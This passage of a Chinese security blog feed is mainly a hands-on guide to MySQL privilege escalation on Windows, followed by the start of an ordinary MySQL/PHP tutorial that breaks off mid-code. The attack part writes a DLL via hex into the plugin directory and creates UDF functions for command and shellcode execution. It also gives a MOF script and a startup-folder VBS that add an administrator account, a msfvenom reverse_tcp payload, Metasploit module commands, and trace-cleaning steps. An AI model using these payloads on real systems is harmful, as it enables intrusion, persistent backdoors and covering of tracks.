class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create table temp(data longblob);</span><br><span class="line">insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);</span><br><span class="line"></span><br><span class="line">update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);</span><br><span class="line"></span><br><span class="line">select data from temp into dumpfile &quot;D:/phpstudy_pro/Extensions/MySQL5.7.26/lib/plugin/test.dll&quot;;</span><br></pre></td></tr></table></figure><h4 id="4-利用函数-to-base64-和-from-base64"><a href="#4-利用函数-to-base64-和-from-base64" class="headerlink" title="4.利用函数 to_base64 和 from_base64"></a>4.<strong>利用函数 to_base64 和 from_base64</strong></h4><p>从 MySQL 5.6.1 和 MariaDB 10.0.5 开始，我们就能使用 to_base64 和 from_base64 来进行编码了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select to_base64(load_file(&#x27;E:\\lib_mysqludf_sys_64.dll&#x27;)) into outfile &quot;E:\\udf64.b64&quot; </span><br></pre></td></tr></table></figure><p>然后我们使用 from_base64 解码并结合 into dumpfile 写入 dll</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select from_base64(&quot;base64 的内容，因为太长了就不贴了&quot;) </span><br></pre></td></tr></table></figure><p>into dumpfile “E:\mysql-5.6.41-winx64\lib\plugin\udf64.dll”;</p><h4 id="5-创建恶意函数并执行"><a href="#5-创建恶意函数并执行" class="headerlink" title="5.创建恶意函数并执行"></a>5.创建恶意函数并执行</h4><p>前面的操作我们已经把恶意dll文件导入到了mysql的lib/plugin目录下，但是我们只是导入了该dll文件，还没有将dll文件进行引用。</p><p>如果直接执行语句<strong>select sys_eval(“whoami”)<strong>会提示</strong>#1305 - FUNCTION security.sys_eval does not exist</strong></p><p><img src="image-20210827112542868.png" alt="image-20210827112542868"></p><p>因此需要先导入dll文件并创建函数！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval RETURNS STRING SONAME &quot;test.dll&quot;</span><br></pre></td></tr></table></figure><p>通过语句 **select * from mysql.func;**查看恶意函数是否创建</p><p><img src="image-20210827113041451.png" alt="image-20210827113041451"></p><p>创建成功后,然后执行<strong>select sys_eval(“whoami”)</strong>  即可正确得到回显！</p><p><img src="image-20210827110315266.png" alt="image-20210827110315266"></p><p>常用命令：</p><p>net user ka1n4t ka1n4t<del>!@ /add //添加新用户：ka1n4t，密码为ka1n4t</del>!@ net localgroup administrators ka1n4t /add //将ka1n4t添加至管理员分组</p><h4 id="6-删除恶意DLL函数"><a href="#6-删除恶意DLL函数" class="headerlink" title="6.删除恶意DLL函数"></a>6.删除恶意DLL函数</h4><p>通过 <strong>drop function 函数名</strong>   命令可以删除创建的恶意DLL函数,销毁痕迹！</p><h3 id="脚本执行UDF提权"><a href="#脚本执行UDF提权" class="headerlink" title="脚本执行UDF提权"></a>脚本执行UDF提权</h3><p>恶意脚本地址：<a href="https://github.com/cream-sec/WebShell-1/blob/master/php/%E6%9A%97%E6%9C%88mysql%E5%85%A8%E7%89%88%E6%9C%AC%E9%80%9A%E6%9D%80%E6%8F%90%E6%9D%83%E7%A5%9E%E5%99%A8(mOon%E5%8E%9F%E5%88%9B).php">https://github.com/cream-sec/WebShell-1/blob/master/php/%E6%9A%97%E6%9C%88mysql%E5%85%A8%E7%89%88%E6%9C%AC%E9%80%9A%E6%9D%80%E6%8F%90%E6%9D%83%E7%A5%9E%E5%99%A8(mOon%E5%8E%9F%E5%88%9B).php</a></p><p>输入账户密码信息</p><p><img src="image-20210827144516163.png" alt="image-20210827144516163"></p><p>选择和mysql匹配的位数后点击导出，如果显示导出成功后，即利用成功</p><p><img src="image-20210827144607457.png" alt="image-20210827144607457"></p><p>之后创建sys_eval函数，并点击提交</p><p><img src="image-20210827144740099.png" alt="image-20210827144740099"></p><p>执行 select_eval(“net user”)执行成功，说明利用成功</p><p><img src="image-20210827144905857.png" alt="image-20210827144905857"></p><h3 id="反弹shell脚本"><a href="#反弹shell脚本" class="headerlink" title="反弹shell脚本"></a>反弹shell脚本</h3><p>适用系统：目标系统是Windows(Win2000,XP,Win2003)</p><p>使用方式和其他的类似，由于没有相关的环境，具体的分析可以看下国光师傅的这篇文章。</p><p><a href="https://www.sqlsec.com/2020/11/mysql.html#toc-heading-21">https://www.sqlsec.com/2020/11/mysql.html#toc-heading-21</a></p><h3 id="利用DLL"><a href="#利用DLL" class="headerlink" title="利用DLL"></a>利用DLL</h3><p><strong>1.sys_exec()</strong></p><p>使用该函数可以执行任意系统命令</p><p>首先加载这段函数。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_exec RETURNS int soname &#x27;udf.dll&#x27; </span><br></pre></td></tr></table></figure><p>然后执行命令</p><p>select sys_exec(“net user”)</p><p>但是没有回显</p><p><strong>2.sys_eval()</strong></p><p>同样可以执行任意系统命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">创建函数命令</span><br><span class="line">create function sys_eval RETURNS int soname &#x27;udf.dll&#x27; </span><br><span class="line">执行命令</span><br><span class="line">select sys_eval(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure><p><strong>3.sys_get()</strong></p><p>该函数返回系统变量的值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">创建sys_get 函数</span><br><span class="line">create function sys_get RETURNS int soname &#x27;udf.so&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">实验失败</span></span><br><span class="line">Select sys_get(&#x27;COMSPEC&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>4.执行Shellcode - sys_bineval</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">创建函数</span><br><span class="line">create function sys_bineval returns int soname &#x27;udf.so&#x27;;</span><br><span class="line"></span><br><span class="line">select to_base64(load_file(&#x27;C:\\Windows\\System32\\calc.exe&#x27;)) into outfile &quot;C:\\Users\\Administrator\\Desktop\\calc.b64&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash">该方法在win10 64位中会把mysql打挂掉，请小心尝试！</span></span><br><span class="line">select sys_bineval(from_base64(load_file(&#x27;C:\\Users\\Administrator\\Desktop\\calc.b64&#x27;)));</span><br></pre></td></tr></table></figure><h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>MOF提权是基本上只有winserver2003环境才能成功，提权的原理是C:/Windows/system32/wbem/mof/目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p><p>使用into outfile 把mof文件导入到C:/Windows/system32/wbem/mof/ 下</p><p>mof的脚本内容如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">pragma namespace(<span class="string">&quot;\\\\.\\root\\subscription&quot;</span>)</span> </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  = &quot;filtP2&quot;; </span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;; </span><br><span class="line">    QueryLanguage = &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;; </span><br><span class="line">    ScriptText = </span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用mysql的hex命令将该文件转化为16进制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&quot;C:\\Users\\Administrator\\Desktop\\123.txt&quot;)) into outfile &quot;C:\\Users\\Administrator\\Desktop\\12.txt&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">16进制内容为：</span><br><span class="linespan><br><span class="line"></span><br></pre></td></tr></table></figure><p>在phpmyadmin中执行以上脚本到C:/Windows/system32/wbem/mof/ 下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select 0xinto dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;</span><br></pre></td></tr></table></figure><p>执行成功后可以在good目录下发现test.mof脚本文件</p><p><img src="image-20210827161757859.png" alt="image-20210827161757859"></p><p>然后在cmd命令行执行net user 命令发现 hacker用户已被添加</p><p><img src="image-20210827162011004.png" alt="image-20210827162011004"></p><h3 id="清理痕迹"><a href="#清理痕迹" class="headerlink" title="清理痕迹"></a>清理痕迹</h3><p>因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 停止 winmgmt 服务</span></span><br><span class="line">net stop winmgmt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除 Repository 文件夹</span></span><br><span class="line">rmdir /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 手动删除 mof 文件</span></span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除创建的用户</span></span><br><span class="line">net user hacker /delete</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重新启动服务</span></span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure><h3 id="MSF中的MOF提权"><a href="#MSF中的MOF提权" class="headerlink" title="MSF中的MOF提权"></a>MSF中的MOF提权</h3><p>MSF中自带的有MOF提权的模块，根据以下命令可以进行操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"></span><br><span class="line">设置目标珠主机</span><br><span class="line">set rhost 192.168.147.163</span><br><span class="line">设置目标数据库用户名</span><br><span class="line">set username root</span><br><span class="line">设置目标数据库密码</span><br><span class="line">set password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="image-20210827163231563.png" alt="image-20210827163231563"></p><h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><p>在windows环境下，如果windows的启动项能够被mysql写入的话可以使用mysql导入自定义脚本到启动项中，这个脚本会在用户再次登陆时自动运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">启动项路径：</span><br><span class="line">Windows Server 2003 的启动项路径：</span><br><span class="line"><span class="meta">#</span><span class="bash"> 中文系统</span></span><br><span class="line">C:\Documents and Settings\Administrator\「开始」菜单\程序\启动</span><br><span class="line">C:\Documents and Settings\All Users\「开始」菜单\程序\启动</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 英文系统</span></span><br><span class="line">C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</span><br><span class="line">C:\Documents and Settings\All Users\Start Menu\Programs\Startup</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 开关机项 需要自己建立对应文件夹</span></span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown</span><br><span class="line"></span><br><span class="line">Windows Server 2008 的启动项路径：</span><br><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>启动项支持VBS以及exe类型，可以将脚本转16进制后导入到目标启动项中！</p><h4 id="脚本生成！"><a href="#脚本生成！" class="headerlink" title="脚本生成！"></a>脚本生成！</h4><p>1.VBS脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Set WshShell=WScript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">WshShell.Run &quot;net user hacker P@ssw0rd /add&quot;, 0</span><br><span class="line">WshShell.Run &quot;net localgroup administrators hacker /add&quot;, 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">16进制文件</span><br><span class="line">536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290D0A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300D0A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C2030</span><br></pre></td></tr></table></figure><p>2.MSF生成EXE</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.193 LPORT=4444 x &gt;shell.exe</span><br><span class="line"></span><br><span class="line">16进制文件</span><br><span class="linespan><br></pre></td></tr></table></figure><p>将以上VBS以及CS的马16进制写入到系统启动项中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A into dumpfile &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs&quot;;</span><br></pre></td></tr></table></figure><p>说明中文路径可能会出现导入失败</p><p>写入成功后等待用户再次登录即可，该脚本就会被执行</p><h4 id="MSF-启动项提权"><a href="#MSF-启动项提权" class="headerlink" title="MSF 启动项提权"></a>MSF 启动项提权</h4><p>msf中封装了mysql的启动项提权方式，下面是具体步骤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_start_up</span><br><span class="line">set rhosts 192.168.147.163</span><br><span class="line">set username root</span><br><span class="line">set password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="image-20210827171552862.png" alt="image-20210827171552862"></p><p>msf开启监听模式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; handler -H 10.20.24.244 -P 4444 -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p>用户重新登录后就可以上线了！</p><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p><a href="https://www.sqlsec.com/2020/11/mysql.html#toc-heading-35">https://www.sqlsec.com/2020/11/mysql.html#toc-heading-35</a>  –国光师傅</p><p><a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a>   UDF提权常用so，dll文件</p><p><a href="https://www.cnblogs.com/litlife/p/9030673.html">https://www.cnblogs.com/litlife/p/9030673.html</a></p><p><a href="https://www.vulner.me/docs/mysql-udf/">https://www.vulner.me/docs/mysql-udf/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql 学习</title>
      <link href="/posts/32254/"/>
      <url>/posts/32254/</url>
      
        <content type="html"><![CDATA[<p>mysql数据库是关系型数据库，一个关系型数据库由一个或数个表格组成，mysql数据库是树状结构，由数据库-》表-》列 结构组成，在查询数据时也要逐级继续查询！下面介绍mysql的一些基础的语法！</p><h2 id="MYSQL和PHP"><a href="#MYSQL和PHP" class="headerlink" title="MYSQL和PHP"></a>MYSQL和PHP</h2><p>语法：</p><p>​    CREATE DATABASE 数据库名;</p><p>实例 ：创建数据库run</p><p>CREATE DATABASE run;</p><h3 id="PHP代码操作数据库"><a href="#PHP代码操作数据库" class="headerlink" title="PHP代码操作数据库"></a>PHP代码操作数据库</h3><p>php中使用了 mysqli_query 创建或删除mysql数据库</p><p>语法如下;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query(connection,query,resultmode);</span><br><span class="line"></span><br><span class="line">connection  :指定要使用的mysql连接</span><br><span class="line">query：   要执行的sql语句</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> mysqli_connect()   连接数据库</span><br><span class="line"> 语法如下：</span><br><span class="line"> mysqli_connect(host, username, password, dbname,port, socket);</span><br><span class="line"></span><br><span class="line">host，username,password是必须的</span><br><span class="line">  </span><br></pre></td></tr></table></figure><h4 id="php连接数据库代码"><a href="#php连接数据库代码" class="headerlink" title="php连接数据库代码"></a>php连接数据库代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$dbhost</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="variable">$dbpass</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="variable">$dbhost</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$conn</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;数据库连接成功&quot;</span>;</span><br><span class="line">    mysqli_close(<span class="variable">$conn</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="mysql-%E5%AD%A6%E4%B9%A0/image-20210824162448913.png" alt="image-20210824162448913"></p><h4 id="php-创建数据库操作"><a href="#php-创建数据库操作" class="headerlink" title="php 创建数据库操作"></a>php 创建数据库操作</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$dbhost</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="variable">$dbpass</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="variable">$dbhost</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$conn</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;数据库连接成功 \n&quot;</span>;</span><br><span class="line">    <span class="comment">#创建数据库语句</span></span><br><span class="line">    <span class="variable">$sql1</span> = <span class="string">&quot;CREATE DATABASE USERS&quot;</span>;</span><br><span class="line">    <span class="variable">$recv</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql1</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$recv</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;创建数据库失败&quot;</span>.mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;创建数据库users 成功&quot;</span>;</span><br><span class="line"></span><br><span class="line">    mysqli_close(<span class="variable">$conn</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="php删除数据库"><a href="#php删除数据库" class="headerlink" title="php删除数据库"></a>php删除数据库</h4><p>命令格式：</p><p>​    drop database 数据库名;</p><p>实例 删除  run 数据库:</p><p>​     drop database run;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbhost</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$dbhost</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$conn</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;数据库连接成功 \n&quot;</span>;</span><br><span class="line"><span class="comment">#删除数据库语句</span></span><br><span class="line"><span class="variable">$sql1</span> = <span class="string">&quot;drop database users&quot;</span>;</span><br><span class="line"><span class="variable">$recv</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql1</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$recv</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;数据库删除失败&quot;</span>.mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;删除成功&quot;</span>;</span><br><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="php-选择数据库"><a href="#php-选择数据库" class="headerlink" title="php 选择数据库"></a>php 选择数据库</h4><p>在mysql 语法中  使用 use关键字来选择特定的数据库</p><p>   use  数据库名；</p><p>实例:选择 run 数据库:</p><p>​            use run ;</p><p>php代码选择数据库使用语句 mysqli_select_db()  执行成功返回True ，失败返回False</p><p>语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysqli_select_db(connection,dbname);</span><br><span class="line"></span><br><span class="line">connection mysql数据库连接</span><br><span class="line"> dbname    选择的数据库</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbhost</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$dbhost</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$conn</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;数据库连接成功 \n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$recv</span> = mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&quot;users&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span 